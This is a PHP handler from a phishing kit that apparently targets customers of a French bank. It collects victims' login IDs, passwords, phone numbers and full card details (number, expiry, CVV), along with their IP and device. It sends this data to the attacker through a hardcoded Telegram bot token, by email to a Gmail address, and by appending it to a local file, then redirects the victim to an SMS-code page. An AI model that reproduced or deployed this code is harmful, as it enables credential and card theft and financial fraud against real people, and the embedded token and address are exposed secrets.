<?php

include("funcs.php");
// for more tools visite https://www.ghostools.com
$message  = "******* New cc SG *******\n\n";
$message .= "Identifiant : ".$_SESSION['user_id']."\n";
$message .= "Password : ".$_SESSION['Hidden1']."\n\n";
$message .= "\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Tél : ".$_SESSION['tel']."\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Numéro de carte : ".$_POST['hehehe']."\n";
$message .= "Date d'expiration : ".$_POST['exp']."\n";
$message .= "CVV : ".$_POST['cv']."\n";
$message .= "***************************************\n\n";

$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";

$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "elabdill91@gmail.com";
$subject = "SG|".$ip."".countryinfo($message);
$headers = "From:  Login <don@mox.fr>";
$token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
mail($send,$subject,$message,$headers);

 
$file = fopen("../infosita.txt","a");
fwrite($file,$message);  

header("Location: sms.php");

?>

